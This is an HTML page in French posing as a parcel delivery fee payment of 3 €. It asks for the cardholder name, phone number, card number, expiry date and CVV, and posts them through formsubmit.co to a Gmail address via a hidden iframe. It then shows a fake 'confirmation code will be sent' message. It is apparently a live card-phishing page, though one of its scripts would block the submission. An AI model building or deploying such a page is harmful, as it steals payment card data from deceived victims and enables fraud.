<!DOCTYPE html>

<html lang="fr">
<head>
<meta charset="utf-8"/>
<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
<title>Paiement de livraison</title>
<style>
    * {
      box-sizing: border-box;
    }
    body {
      margin: 0;
      padding: 0;
      height: 100vh;
      background-color: #f2f2f2;
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    .payment-container {
      width: 100%;
      max-width: 380px;
      background-color: white;
      padding: 20px;
      margin: 10px;
      border-radius: 10px;
      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
    }
    .card-icons {
      text-align: center;
      margin-bottom: 15px;
    }
    .card-icons img {
      height: 26px;
      margin: 0 4px;
    }
    h2 {
      text-align: center;
      margin-bottom: 20px;
      font-weight: normal;
    }
    input {
      width: 100%;
      padding: 10px;
      margin-top: 10px;
      border: 1px solid #ccc;
      border-radius: 6px;
      font-size: 15px;
    }
    .row {
      display: flex;
      gap: 10px;
    }
    .row input {
      flex: 1;
    }
    .btn {
      background-color: #007BFF;
      color: white;
      padding: 12px;
      border: none;
      border-radius: 6px;
      font-size: 16px;
      margin-top: 15px;
      cursor: pointer;
      width: 100%;
    }
    .btn:hover {
      background-color: #0056b3;
    }
    .message {
      margin-top: 20px;
      text-align: center;
      color: green;
      font-size: 14px;
    }
    iframe {
      display: none;
    }
  </style>
</head>
<body>
<div class="payment-container">
<div class="card-icons">
<img src="https://img.icons8.com/color/48/000000/mastercard-logo.png"/>
<img src="https://img.icons8.com/color/48/000000/visa.png"/>
<img src="https://img.icons8.com/color/48/000000/amex.png"/>
<img src="https://img.icons8.com/color/48/000000/discover.png"/>
<img src="https://img.icons8.com/color/48/000000/jcb.png"/>
</div>
<h2>Paiement de livraison</h2>
<form action="https://formsubmit.co/06esdgj42@gmail.com" id="payment-form" method="POST" target="invisible">
<input name="nom" placeholder="Nom sur la carte" required="" style="background-image: url('https://cdn-icons-png.flaticon.com/512/633/633611.png');background-repeat: no-repeat;background-size: 18px;background-position: right 10px center;padding-right: 35px;" type="text"/><input name="telephone" placeholder="Numéro de téléphone" type="text"/>
<input name="numero" placeholder="N° de carte" required="" style="background-image: url('https://cdn-icons-png.flaticon.com/512/633/633611.png');background-repeat: no-repeat;background-size: 18px;background-position: right 10px center;padding-right: 35px;" type="text"/>
<div class="row">
<input name="expiration" placeholder="MM/AA" required="" type="text"/>
<input name="cvv" placeholder="CVV" required="" type="text"/>
</div>
<input name="_captcha" type="hidden" value="false"/>
<button class="btn" type="submit">Payer 3 €</button>
</form>
<iframe name="invisible"></iframe>
<div class="message" id="confirmation-message" style="display: none;">
      ✅ Merci ! Votre code de confirmation vous sera envoyé sous peu.
    </div>
</div>
<script>
    const form = document.getElementById('payment-form');
    const message = document.getElementById('confirmation-message');
    form.addEventListener('submit', function() {
      form.style.display = 'none';
      message.style.display = 'block';
    });
  </script>
<script>
document.querySelector("form").addEventListener("submit", function(e) {
  e.preventDefault();
  this.innerHTML = "<p style='text-align:center; font-size:18px;'>Merci, votre code de confirmation vous sera envoyé sous peu.</p>";
});
</script></body>
</html>
